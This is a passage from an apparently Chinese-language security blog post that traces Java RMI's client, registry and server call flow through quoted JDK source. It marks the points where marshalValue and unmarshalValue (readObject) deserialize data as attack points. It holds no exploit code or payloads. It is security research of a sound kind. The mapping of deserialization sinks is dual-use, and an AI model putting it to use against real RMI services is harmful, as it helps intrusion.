getMethodHash(method));</span><br><span class="line">       &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">           ......</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>在<code>UnicastRef#invoke</code>中，仍然调用了<code>call.executeCall()</code>，我们知道，只要与网络请求有关的就会调用它，这里会有一个攻击点</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Remote obj,</span></span><br><span class="line"><span class="params">                         Method method,</span></span><br><span class="line"><span class="params">                         Object[] params,</span></span><br><span class="line"><span class="params">                         <span class="type">long</span> opnum)</span></span><br><span class="line">        <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (clientRefLog.isLoggable(Log.VERBOSE)) &#123;</span><br><span class="line">            clientRefLog.log(Log.VERBOSE, <span class="string">&quot;method: &quot;</span> + method);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (clientCallLog.isLoggable(Log.VERBOSE)) &#123;</span><br><span class="line">            logClientCall(obj, method);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> ref.getChannel().newConnection();</span><br><span class="line">        <span class="type">RemoteCall</span> <span class="variable">call</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">reuse</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* If the call connection is &quot;reused&quot; early, remember not to</span></span><br><span class="line"><span class="comment">         * reuse again.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">boolean</span> <span class="variable">alreadyFreed</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (clientRefLog.isLoggable(Log.VERBOSE)) &#123;</span><br><span class="line">                clientRefLog.log(Log.VERBOSE, <span class="string">&quot;opnum = &quot;</span> + opnum);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// create call context</span></span><br><span class="line">            call = <span class="keyword">new</span> <span class="title class_">StreamRemoteCall</span>(conn, ref.getObjID(), -<span class="number">1</span>, opnum);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// marshal parameters</span></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">ObjectOutput</span> <span class="variable">out</span> <span class="operator">=</span> call.getOutputStream();</span><br><span class="line">                marshalCustomCallData(out);</span><br><span class="line">                Class&lt;?&gt;[] types = method.getParameterTypes();</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; types.length; i++) &#123;</span><br><span class="line">                    marshalValue(types[i], params[i], out);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                clientRefLog.log(Log.BRIEF,</span><br><span class="line">                    <span class="string">&quot;IOException marshalling arguments: &quot;</span>, e);</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshalling arguments&quot;</span>, e);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// unmarshal return</span></span><br><span class="line">            call.executeCall();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Class&lt;?&gt; rtype = method.getReturnType();</span><br><span class="line">                <span class="keyword">if</span> (rtype == <span class="keyword">void</span>.class)</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                <span class="type">ObjectInput</span> <span class="variable">in</span> <span class="operator">=</span> call.getInputStream();</span><br><span class="line"></span><br><span class="line">                <span class="comment">/* StreamRemoteCall.done() does not actually make use</span></span><br><span class="line"><span class="comment">                 * of conn, therefore it is safe to reuse this</span></span><br><span class="line"><span class="comment">                 * connection before the dirty call is sent for</span></span><br><span class="line"><span class="comment">                 * registered refs.</span></span><br><span class="line"><span class="comment">                 */</span></span><br><span class="line">                <span class="type">Object</span> <span class="variable">returnValue</span> <span class="operator">=</span> unmarshalValue(rtype, in);</span><br><span class="line"></span><br><span class="line">                <span class="comment">/* we are freeing the connection now, do not free</span></span><br><span class="line"><span class="comment">                 * again or reuse.</span></span><br><span class="line"><span class="comment">                 */</span></span><br><span class="line">                alreadyFreed = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">                <span class="comment">/* if we got to this point, reuse must have been true. */</span></span><br><span class="line">                clientRefLog.log(Log.BRIEF, <span class="string">&quot;free connection (reuse = true)&quot;</span>);</span><br><span class="line"></span><br><span class="line">                <span class="comment">/* Free the call&#x27;s connection early. */</span></span><br><span class="line">                ref.getChannel().free(conn, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> returnValue;</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                clientRefLog.log(Log.BRIEF,</span><br><span class="line">                                 <span class="string">&quot;IOException unmarshalling return: &quot;</span>, e);</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling return&quot;</span>, e);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">                clientRefLog.log(Log.BRIEF,</span><br><span class="line">                    <span class="string">&quot;ClassNotFoundException unmarshalling return: &quot;</span>, e);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling return&quot;</span>, e);</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    call.done();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    <span class="comment">/* WARNING: If the conn has been reused early,</span></span><br><span class="line"><span class="comment">                     * then it is too late to recover from thrown</span></span><br><span class="line"><span class="comment">                     * IOExceptions caught here. This code is relying</span></span><br><span class="line"><span class="comment">                     * on StreamRemoteCall.done() not actually</span></span><br><span class="line"><span class="comment">                     * throwing IOExceptions.</span></span><br><span class="line"><span class="comment">                     */</span></span><br><span class="line">                    reuse = <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (RuntimeException e) &#123;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * Need to distinguish between client (generated by the</span></span><br><span class="line"><span class="comment">             * invoke method itself) and server RuntimeExceptions.</span></span><br><span class="line"><span class="comment">             * Client side RuntimeExceptions are likely to have</span></span><br><span class="line"><span class="comment">             * corrupted the call connection and those from the server</span></span><br><span class="line"><span class="comment">             * are not likely to have done so.  If the exception came</span></span><br><span class="line"><span class="comment">             * from the server the call connection should be reused.</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            <span class="keyword">if</span> ((call == <span class="literal">null</span>) ||</span><br><span class="line">                (((StreamRemoteCall) call).getServerException() != e))</span><br><span class="line">            &#123;</span><br><span class="line">                reuse = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">throw</span> e;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * Some failure during call; assume connection cannot</span></span><br><span class="line"><span class="comment">             * be reused.  Must assume failure even if ServerException</span></span><br><span class="line"><span class="comment">             * or ServerError occurs since these failures can happen</span></span><br><span class="line"><span class="comment">             * during parameter deserialization which would leave</span></span><br><span class="line"><span class="comment">             * the connection in a corrupted state.</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            reuse = <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">throw</span> e;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Error e) &#123;</span><br><span class="line">            <span class="comment">/* If errors occurred, the connection is most likely not</span></span><br><span class="line"><span class="comment">             *  reusable.</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            reuse = <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">throw</span> e;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* alreadyFreed ensures that we do not log a reuse that</span></span><br><span class="line"><span class="comment">             * may have already happened.</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            <span class="keyword">if</span> (!alreadyFreed) &#123;</span><br><span class="line">                <span class="keyword">if</span> (clientRefLog.isLoggable(Log.BRIEF)) &#123;</span><br><span class="line">                    clientRefLog.log(Log.BRIEF, <span class="string">&quot;free connection (reuse = &quot;</span> +</span><br><span class="line">                                           reuse + <span class="string">&quot;)&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                ref.getChannel().free(conn, reuse);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>还有一个地方，这个方法会将传入的参数传入<code>marshalValue</code>中，这里面是进行序列化操作的，那么有序列化，肯定还有反序列化，就在<code>executeCall</code>后的<code>unmarshalValue</code>方法内，将传回来的参数进行反序列化，这里就又存在一个攻击点</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">static</span> Object <span class="title function_">unmarshalValue</span><span class="params">(Class&lt;?&gt; type, ObjectInput in)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (type.isPrimitive()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (type == <span class="type">int</span>.class) &#123;</span><br><span class="line">                <span class="keyword">return</span> Integer.valueOf(in.readInt());</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type == <span class="type">boolean</span>.class) &#123;</span><br><span class="line">                <span class="keyword">return</span> Boolean.valueOf(in.readBoolean());</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type == <span class="type">byte</span>.class) &#123;</span><br><span class="line">                <span class="keyword">return</span> Byte.valueOf(in.readByte());</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type == <span class="type">char</span>.class) &#123;</span><br><span class="line">                <span class="keyword">return</span> Character.valueOf(in.readChar());</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type == <span class="type">short</span>.class) &#123;</span><br><span class="line">                <span class="keyword">return</span> Short.valueOf(in.readShort());</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type == <span class="type">long</span>.class) &#123;</span><br><span class="line">                <span class="keyword">return</span> Long.valueOf(in.readLong());</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type == <span class="type">float</span>.class) &#123;</span><br><span class="line">                <span class="keyword">return</span> Float.valueOf(in.readFloat());</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type == <span class="type">double</span>.class) &#123;</span><br><span class="line">                <span class="keyword">return</span> Double.valueOf(in.readDouble());</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;Unrecognized primitive type: &quot;</span> + type);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> in.readObject();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<h4 id="xifa1">客户端请求注册中心-注册中心</h4>
接下来我们看看当客户端请求注册中心的时候，注册中心做了一些什么样的操作

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">IRemoteObj</span> <span class="variable">remoteObj</span> <span class="operator">=</span> (IRemoteObj) registry.lookup(<span class="string">&quot;remoteObj&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>服务端调用Skel，客户端调用Stub，所以断点应该下载RegistryImpl_Skel类中，我们也是需要看下到底是怎么调用到RegistryImpl_Skel中的</p>
<p>我们走到之前的listen方法处，listen方法创建了一个新的线程，主要需要去看AcceptLoop里面的run方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">listen</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="keyword">assert</span> Thread.holdsLock(<span class="built_in">this</span>);</span><br><span class="line">        <span class="type">TCPEndpoint</span> <span class="variable">ep</span> <span class="operator">=</span> getEndpoint();</span><br><span class="line">        <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> ep.getPort();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (server == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (tcpLog.isLoggable(Log.BRIEF)) &#123;</span><br><span class="line">                tcpLog.log(Log.BRIEF,</span><br><span class="line">                    <span class="string">&quot;(port &quot;</span> + port + <span class="string">&quot;) create server socket&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                server = ep.newServerSocket();</span><br><span class="line">                <span class="comment">/*</span></span><br><span class="line"><span class="comment">                 * Don&#x27;t retry ServerSocket if creation fails since</span></span><br><span class="line"><span class="comment">                 * &quot;port in use&quot; will cause export to hang if an</span></span><br><span class="line"><span class="comment">                 * RMIFailureHandler is not installed.</span></span><br><span class="line"><span class="comment">                 */</span></span><br><span class="line">                <span class="type">Thread</span> <span class="variable">t</span> <span class="operator">=</span> AccessController.doPrivileged(</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">NewThreadAction</span>(<span class="keyword">new</span> <span class="title class_">AcceptLoop</span>(server),</span><br><span class="line">                                        <span class="string">&quot;TCP Accept-&quot;</span> + port, <span class="literal">true</span>));</span><br><span class="line">                t.start();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (java.net.BindException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ExportException</span>(<span class="string">&quot;Port already in use: &quot;</span> + port, e);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ExportException</span>(<span class="string">&quot;Listen failed on port: &quot;</span> + port, e);</span><br><span class="line">            &#125;</span><br><span class="line">        ......</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>在AcceptLoop的run方法中，其实并没有什么东西，只有一个executeAcceptLoop方法，走入</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                executeAcceptLoop();</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="comment">/*</span></span><br><span class="line"><span class="comment">                     * Only one accept loop is started per server</span></span><br><span class="line"><span class="comment">                     * socket, so after no more connections will be</span></span><br><span class="line"><span class="comment">                     * accepted, ensure that the server socket is no</span></span><br><span class="line"><span class="comment">                     * longer listening.</span></span><br><span class="line"><span class="comment">                     */</span></span><br><span class="line">                    serverSocket.close();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>在executeAcceptLoop方法中，创建了新的线程ConnectionHandler</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">executeAcceptLoop</span><span class="params">()</span> &#123;</span><br><span class="line">           <span class="keyword">if</span> (tcpLog.isLoggable(Log.BRIEF)) &#123;</span><br><span class="line">               tcpLog.log(Log.BRIEF, <span class="string">&quot;listening on port &quot;</span> +</span><br><span class="line">                          getEndpoint().getPort());</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">               <span class="type">Socket</span> <span class="variable">socket</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">               <span class="keyword">try</span> &#123;</span><br><span class="line">                   socket = serverSocket.accept();</span><br><span class="line"></span><br><span class="line">                   <span class="comment">/*</span></span><br><span class="line"><span class="comment">                    * Find client host name (or &quot;0.0.0.0&quot; if unknown)</span></span><br><span class="line"><span class="comment">                    */</span></span><br><span class="line">                   <span class="type">InetAddress</span> <span class="variable">clientAddr</span> <span class="operator">=</span> socket.getInetAddress();</span><br><span class="line">                   <span class="type">String</span> <span class="variable">clientHost</span> <span class="operator">=</span> (clientAddr != <span class="literal">null</span></span><br><span class="line">                                        ? clientAddr.getHostAddress()</span><br><span class="line">                                        : <span class="string">&quot;0.0.0.0&quot;</span>);</span><br><span class="line"></span><br><span class="line">                   <span class="comment">/*</span></span><br><span class="line"><span class="comment">                    * Execute connection handler in the thread pool,</span></span><br><span class="line"><span class="comment">                    * which uses non-system threads.</span></span><br><span class="line"><span class="comment">                    */</span></span><br><span class="line">                   <span class="keyword">try</span> &#123;</span><br><span class="line">                       connectionThreadPool.execute(</span><br><span class="line">                           <span class="keyword">new</span> <span class="title class_">ConnectionHandler</span>(socket, clientHost));</span><br><span class="line">                   &#125; <span class="keyword">catch</span> (RejectedExecutionException e) &#123;</span><br><span class="line">                       closeSocket(socket);</span><br><span class="line">                       tcpLog.log(Log.BRIEF,</span><br><span class="line">                                  <span class="string">&quot;rejected connection from &quot;</span> + clientHost);</span><br><span class="line">                   &#125;</span><br><span class="line"></span><br><span class="line">               &#125; </span><br><span class="line">               ......</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure>

<p>我们看TCPTransport的run方法，在其被调用时，其方法内部会调用run0方法</p>
<p>其中较为重要的就是handleMessages</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// TCPTransport#run</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="type">Thread</span> <span class="variable">t</span> <span class="operator">=</span> Thread.currentThread();</span><br><span class="line">            <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> t.getName();</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                t.setName(<span class="string">&quot;RMI TCP Connection(&quot;</span> +</span><br><span class="line">                          connectionCount.incrementAndGet() +</span><br><span class="line">                          <span class="string">&quot;)-&quot;</span> + remoteHost);</span><br><span class="line">                AccessController.doPrivileged((PrivilegedAction&lt;Void&gt;)() -&gt; &#123;</span><br><span class="line">                    run0();</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;, NOPERMS_ACC);</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                t.setName(name);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// TCPTransport#run0</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">run0</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">            ......</span><br><span class="line">                    <span class="comment">// read input messages</span></span><br><span class="line">                    handleMessages(conn, <span class="literal">true</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">              ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在handleMessages方法中，op在默认情况下都是TransportConstants.Call，所以最后会调用到serviceCall方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">handleMessages</span><span class="params">(Connection conn, <span class="type">boolean</span> persistent)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> getEndpoint().getPort();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">DataInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DataInputStream</span>(conn.getInputStream());</span><br><span class="line">            <span class="keyword">do</span> &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">op</span> <span class="operator">=</span> in.read();     <span class="comment">// transport op</span></span><br><span class="line">                <span class="keyword">if</span> (op == -<span class="number">1</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (tcpLog.isLoggable(Log.BRIEF)) &#123;</span><br><span class="line">                        tcpLog.log(Log.BRIEF, <span class="string">&quot;(port &quot;</span> +</span><br><span class="line">                            port + <span class="string">&quot;) connection closed&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (tcpLog.isLoggable(Log.BRIEF)) &#123;</span><br><span class="line">                    tcpLog.log(Log.BRIEF, <span class="string">&quot;(port &quot;</span> + port +</span><br><span class="line">                        <span class="string">&quot;) op = &quot;</span> + op);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">switch</span> (op) &#123;</span><br><span class="line">                <span class="keyword">case</span> TransportConstants.Call:</span><br><span class="line">                    <span class="comment">// service incoming RMI call</span></span><br><span class="line">                    <span class="type">RemoteCall</span> <span class="variable">call</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StreamRemoteCall</span>(conn);</span><br><span class="line">                    <span class="keyword">if</span> (serviceCall(call) == <span class="literal">false</span>)</span><br><span class="line">                        <span class="keyword">return</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">case</span> TransportConstants.Ping:</span><br><span class="line">                 ......</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">while</span> (persistent);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>serviceCall方法中会从静态表中读取处Targert</p>
<p>此时serviceCall中disp是一个RegistryImpl_Skel类，该方法会从target中提取出dispatcher</p>
<p>最后会调用到disp.dispatch方法，进入到RegistryImpl_Skel类的dispatch方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">serviceCall</span><span class="params">(<span class="keyword">final</span> RemoteCall call)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ......</span><br><span class="line">            <span class="type">Transport</span> <span class="variable">transport</span> <span class="operator">=</span> id.equals(dgcID) ? <span class="literal">null</span> : <span class="built_in">this</span>;</span><br><span class="line">            <span class="type">Target</span> <span class="variable">target</span> <span class="operator">=</span></span><br><span class="line">                ObjectTable.getTarget(<span class="keyword">new</span> <span class="title class_">ObjectEndpoint</span>(id, transport));</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (target == <span class="literal">null</span> || (impl = target.getImpl()) == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoSuchObjectException</span>(<span class="string">&quot;no such object in table&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">final</span> <span class="type">Dispatcher</span> <span class="variable">disp</span> <span class="operator">=</span> target.getDispatcher();</span><br><span class="line">            target.incrementCallCount();</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">/* call the dispatcher */</span></span><br><span class="line">                transportLog.log(Log.VERBOSE, <span class="string">&quot;call dispatcher&quot;</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">final</span> <span class="type">AccessControlContext</span> <span class="variable">acc</span> <span class="operator">=</span></span><br><span class="line">                    target.getAccessControlContext();</span><br><span class="line">                <span class="type">ClassLoader</span> <span class="variable">ccl</span> <span class="operator">=</span> target.getContextClassLoader();</span><br><span class="line"></span><br><span class="line">                <span class="type">ClassLoader</span> <span class="variable">savedCcl</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    setContextClassLoader(ccl);</span><br><span class="line">                    currentTransport.set(<span class="built_in">this</span>);</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        java.security.AccessController.doPrivileged(</span><br><span class="line">                            <span class="keyword">new</span> <span class="title class_">java</span>.security.PrivilegedExceptionAction&lt;Void&gt;() &#123;</span><br><span class="line">                            <span class="keyword">public</span> Void <span class="title function_">run</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">                                checkAcceptPermission(acc);</span><br><span class="line">                                disp.dispatch(impl, call);</span><br><span class="line">                                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;, acc);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (java.security.PrivilegedActionException pae) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> (IOException) pae.getException();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    setContextClassLoader(savedCcl);</span><br><span class="line">                    currentTransport.set(<span class="literal">null</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException ex) &#123;</span><br><span class="line">                transportLog.log(Log.BRIEF,</span><br><span class="line">                                 <span class="string">&quot;exception thrown by dispatcher: &quot;</span>, ex);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                target.decrementCallCount();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// if calls are being logged, write out exception</span></span><br><span class="line">            <span class="keyword">if</span> (UnicastServerRef.callLog.isLoggable(Log.BRIEF)) &#123;</span><br><span class="line">                <span class="comment">// include client host name if possible</span></span><br><span class="line">                <span class="type">String</span> <span class="variable">clientHost</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    clientHost = <span class="string">&quot;[&quot;</span> +</span><br><span class="line">                        RemoteServer.getClientHost() + <span class="string">&quot;] &quot;</span>;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (ServerNotActiveException ex) &#123;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="type">String</span> <span class="variable">message</span> <span class="operator">=</span> clientHost + <span class="string">&quot;exception: &quot;</span>;</span><br><span class="line">                UnicastServerRef.callLog.log(Log.BRIEF, message, e);</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">ObjectOutput</span> <span class="variable">out</span> <span class="operator">=</span> call.getResultStream(<span class="literal">false</span>);</span><br><span class="line">                UnicastServerRef.clearStackTraces(e);</span><br><span class="line">                out.writeObject(e);</span><br><span class="line">                call.releaseOutputStream();</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException ie) &#123;</span><br><span class="line">                transportLog.log(Log.BRIEF,</span><br><span class="line">                    <span class="string">&quot;exception thrown marshalling exception: &quot;</span>, ie);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="sUKII">客户端请求服务端-服务端</h2>
服务端和注册中心的流程其实一样，当客户端去调用服务端远程方法时，最后也会进入serviceCall方法，调用dispatch方法

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">disp.dispatch(impl, call);</span><br></pre></td></tr></table></figure>

<p>进入dispatch方法后，我们可以看到，当skel为null的时候，才能走到下面的代码，第一个target为DGC，此时skel不为空直接返回</p>
<p>当我们请求到服务端动态代理后，发现skel为空，则不会直接返回而是走到下面的代码。</p>
<p>首先会读取输入流，从输入流中先获取到method，就是我们所调用的sayhello方法</p>
<p>接下来会将我们的参数用unmarshalValue反序列化出来，再调用method.invoke方法去调用我们所调用的sayHello方法，然后会用marshalValue将函数的返回值result序列化进去，将其传回客户端</p>
